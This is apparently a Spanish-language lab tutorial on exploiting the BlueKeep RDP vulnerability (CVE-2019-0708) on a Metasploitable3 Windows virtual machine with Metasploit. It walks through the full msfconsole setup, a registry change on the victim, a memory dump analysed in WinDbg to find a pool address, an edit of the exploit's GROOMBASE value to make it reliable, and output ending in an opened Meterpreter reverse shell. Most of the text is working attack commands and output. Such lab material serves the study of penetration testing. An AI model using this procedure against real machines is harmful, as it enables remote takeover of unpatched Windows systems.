# Metasploit (explotación avanzada)

En el reporte que sacamos con `Nessus` encontramos una vulnerabilidad en la maquina victima `Windows` que se llama `BlueKeep` es una vulnerabilidad muy critica que salio en `2019` la cual permitia ejecutar codigo de forma remota sin credenciales, si tenias el `RDP` instalado, ya que este programa era muy comun en los equipos de `Windows` y por eso fue una de las vulnerabilidades mas grandes que ha habido.

Metiendonos en `metasploit` su consola, buscaremos por dicha vulnerabilidad:

```shell
search bluekeep
```

Info:

```
Matching Modules
================

   #  Name                                            Disclosure Date  Rank    Check  Description
   -  ----                                            ---------------  ----    -----  -----------
   0  auxiliary/scanner/rdp/cve_2019_0708_bluekeep    2019-05-14       normal  Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
   1  exploit/windows/rdp/cve_2019_0708_bluekeep_rce  2019-05-14       manual  Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free


Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

Y nos encontrara un `auxiliar` y un `exploit`.

El `auxiliar` nos servira para escanear la maquina victima y verificar si es vulnerable a dicho `exploit`, pero en este caso como ya lo sabemos, iremos directos al `exploit`, pero antes de entrar vemos en la parte de `Rank` que esta como `Manual` cuando en otros aparecia como `Excellent`, esto significa que es mas complicado de utilizar ya que a lo mejor para que el `exploit` funcione correctamente tendremos que hacerle algunos cambios nosotros a nivel de codigo fuente o demas cosas.

Por lo que vamos a seleccionarlo:

```shell
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

En este caso nos viene un `payload` preconfigurado, en este caso es un `meterpreter` que es una `shell` mucho mas avanzada dondo nos permitira hacer bastantes cosas a nivel de terminal.

Establecemos la IP de la maquina victima `Windows`:

```shell
set RHOSTS 192.168.16.132
```

Establecemos nuestra IP para la `shell`:

```shell
set LHOST 192.168.16.128
```

Ahora tendremos que establecer el `target` para que no lo haga de forma automatica, ya que podria dar fallo:

```shell
show targets
```

Info:

```
Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Automatic targeting via fingerprinting
    1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)
    2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)
    3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)
    4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)
    5   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)
    6   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)
    7   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)
    8   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - QEMU/KVM)
```

En este caso estan estos, por lo que nosotros elegiremos el numero `5` el llamado `Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)` ya que es el mas cercano a donde estamos realizando el ataque, por que yo estoy en `VMware 17 Pro` por lo que elegiremos el mas cercano que en este caso seria el `VMware 15.1`, para los de `Virtual Box` seria el numero `2` y para los que esten en un `host` de un `hypervisor` de tipo `1` seria el numero `1`.

```shell
set target 5
```

Pero antes de lanzar el `exploit` si ponemos `info` nos mostrara la descripcion del `exploit` en la que nos dice en una parte que es necesario que una cierta clave de registro este en `0` en la maquina `windows` por lo que nos iremos a la maquina `windows` para dejarlo en `0`, esto se podria hacer aprovechando otra vulnerabilidad y cambiandolo desde terminal, pero para hacerlo mas sencillo lo haremos de esta forma.

En la maquina `windows` pulsaremos `Windows + R` y escribiremos `regedit` + `ENTER`, esto nos llevara a una ventana del `editor de regsitros`.

`KEY_LOCAL_MACHINE` -> `SYSTEM` -> `CurrentControlSet` -> `Control` -> `Terminal Server` -> `WinStations` -> `RDP-Tcp`

Dentro de este fichero cambiamos el archivo de `fDisableCam` dandole doble click y lo establecemos en `0` -> `Ok` -> y con esto ya estaria modificado la clave de registro que teniamos que poner en `0`.

Y ahora volviendo a `kali` intentaremos explotar la maquina poniendo `exploit`.

```
[*] Started reverse TCP handler on 192.168.16.128:4444 
[*] 192.168.16.132:3389 - Running automatic check ("set AutoCheck false" to disable)
[*] 192.168.16.132:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[+] 192.168.16.132:3389   - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 192.168.16.132:3389   - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.16.132:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 192.168.16.132:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028608000, Channel count 1.
[!] 192.168.16.132:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 192.168.16.132:3389 - Surfing channels ...
[*] 192.168.16.132:3389 - Lobbing eggs ...
[*] 192.168.16.132:3389 - Forcing the USE of FREE'd object ...
[!] 192.168.16.132:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Exploit completed, but no session was created.
```

Por lo que vemos nos dice que si ha funcionado el exploit, pero que ha tenido que haber algun tipo de problema por que no nos ha proporcionado la `shell`.

Esto pasa por que como bien hemos visto antes, es un `exploit` manual, por lo que va a requerir de un cambio de forma manual en el codigo o en alguna parte para que esto funcione, si lo volvieramos a ejecutar la maquina `windows` daria un error como una `denegacion de servicio` poniendo que se intento hacer una `paginacion`, por lo que tendremos que cambiar una cosa del codigo para que cuando injecte la `shell` la injecte en un sitio donde no `pagine` esta memoria y asi no de un error y podamos obtener una `shell`.

Por lo que nos iremos a una terminal nueva de `kali` para abrir el codigo y hacerle unas pequeñas modificaciones.

```shell
cd /usr/share/metasploit-framework/modules/exploits/windows/rdp
```

Y abrimos el `exploit` con el `nano`:

```shell
nano cve_2019_0708_bluekeep_rce.rb

#Dentro del nano

[
            # This address works on VMWare 15.1
            'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)',
            {
              'Platform' => 'win',
              'Arch' => [ARCH_X64],
              'GROOMBASE' => 0xfffffa8018c08000
            }
],
```

En muchas ocasiones nos comenta este `exploit` que en la direccion de memoria donde esta depositando la `shell` y esta realizando la `paginacion` no es la que coincide con nuestra maquina atacante, por lo que nosotros tendremos que cambiar de forma manual esta direccion de memoria para que pueda hacer la `paginacion` de forma buna y asi nos proporcione la `shell` sin ningun tipo de error.

Nos iremos a esta parte del codigo y comentaremos esa linea de `'GROOMBASE' => 0xfffffa8018c08000`, debajo pondremos lo mismo pero cambiando la direccion de memoria a la adecuada y como podremos saber cual es la direccion de memoria adecuada?, podremos hacerlo de la siguiente forma:

Lo que vamos hacer es `suspender` la maquina victima `windows`.

Nos descargaremos en nuestra maquina `host` en mi caso de `windows` una herramienta llamada `vmss2core`:

URL = [Download ZIP](https://drive.google.com/file/d/1XLdlI13Jub8tYp3yBCUXRKz3KvU0v4Fm/view?usp=sharing)

Despues vamos a utilizar un `debugger` como estoy en `windows` sera la herramienta `windbg`.

(En linux por ejemplo se podria utilizar el famoso `gdb`)

URL = [Download WinDbg](https://www.microsoft.com/store/productId/9PGJGD53TN86?ocid=pdpshare)

Una vez que este instalada, le daremos a iniciar y tendremos que ver algo asi:

!\[\[Pasted image 20241114113633.png]]

Pero este `debugger` necesitara algun fichero de memoria en la que poder buscar, por lo que tendremos coger todas las direcciones de memoria que tiene esa maquina virtual, volcarlas a un fichero y con `WinDbg` lo que vamos hacer es buscar de todas esas direcciones donde se encuentra la direccion donde comienza la memoria que no `pagina`.

Nos iremos a la carpeta donde esta nuestra maquina `metasploitable-Windows` -> crearemos un directorio en el escritorio de nuestro `host` llamado por ejemplo `win2008` -> seleccionaremos 2 archivos llamados `metasploitable3-win2k8-81b477c7.vmss` y `metasploitable3-win2k8-81b477c7.vmem`, los copiaremos y los pegaremos en la carpeta que creamos llamada `win2008` -> abrimos un `cmd` de nuestro `windows` `host` y nos vamos donde estan estos 2 archivos en la carpeta `win2008`.

Ahora vamos a utilizar la herramienta `vmss2core` que nos descargamos, por lo que pondremos lo siguiente:

Copiamos la ruta de la carpeta donde se encuentra lo que descargamos (`vmss2core`)

```shell
"C:\Users\user\Desktop\vmss2core\vmss2core\vmss2core.exe" -W metasploitable3-win2k8-81b477c7.vmss metasploitable3-win2k8-81b477c7.vmem
```

Esto lo que va hacer es un volcado de memoria a un fichero, por lo que una vez que se complete, veremos que se creo un fichero llamado `memory.dmp`

Por lo que le daremos doble click al dichero de `memoria` y se nos abrira con la aplicacion `windbg` automaticamente, viendo algo asi:

!\[\[Pasted image 20241114114806.png]]

Donde pone `0: kd>` pondremos el siguiente comando:

```
!poolfind 0
```

Lo que va hacer esto es buscar esa parte de la memoria que no `pagina` y veremos lo siguiente:

!\[\[Pasted image 20241114114945.png]]

Por lo que vemos la hemos encontrado, en mi caso elegire la primera direccion de memoria que nos da, para insertarla en el codigo (`fffffa80042d7000`).

Y tendria que quedar algo tal que asi el `nano`:

```shell
[
            # This address works on VMWare 15.1
            'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)',
            {
              'Platform' => 'win',
              'Arch' => [ARCH_X64],
              # 'GROOMBASE' => 0xfffffa8018c08000
              'GROOMBASE' => 0xfffffa80042d7000  
            }
],
```

Por lo que cerramos y guardamos.

Y con esto ya tendriamos modificado este `exploit` de manera manual y listo para lanzar.

Pero antes tendremos que recargar `metasploit` por lo que nos salimos de `metasploit` y volvemos a entrar.

```shell
msfconsole -q
```

Volvemos a configurar todo de nuevo otra vez, estableciendo la IP del atacante, la de destino, los targets, etc...

Pero antes de iniciarlo, estableceremos el `groomsize` a `50`:

```shell
set groomsize 50
```

Una vez que este todo establecido, le daremos a `exploit`:

```
[*] Started reverse TCP handler on 192.168.16.128:4444 
[*] 192.168.16.132:3389 - Running automatic check ("set AutoCheck false" to disable)
[*] 192.168.16.132:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[+] 192.168.16.132:3389   - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 192.168.16.132:3389   - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.16.132:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 192.168.16.132:3389 - Using CHUNK grooming strategy. Size 50MB, target address 0xfffffa80074d7000, Channel count 1.
[!] 192.168.16.132:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 192.168.16.132:3389 - Surfing channels ...
[*] 192.168.16.132:3389 - Lobbing eggs ...
[*] 192.168.16.132:3389 - Forcing the USE of FREE'd object ...
[!] 192.168.16.132:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Sending stage (201798 bytes) to 192.168.16.132
[*] Meterpreter session 1 opened (192.168.16.128:4444 -> 192.168.16.132:49301) at 2024-11-14 06:00:40 -0500

meterpreter >
```

> NOTA:

Hay a veces que esto es tan sensible que aun habiendo modificado todo puede ser que no nos salga a la primera, pero probando varias veces deberia de llegar a salir.
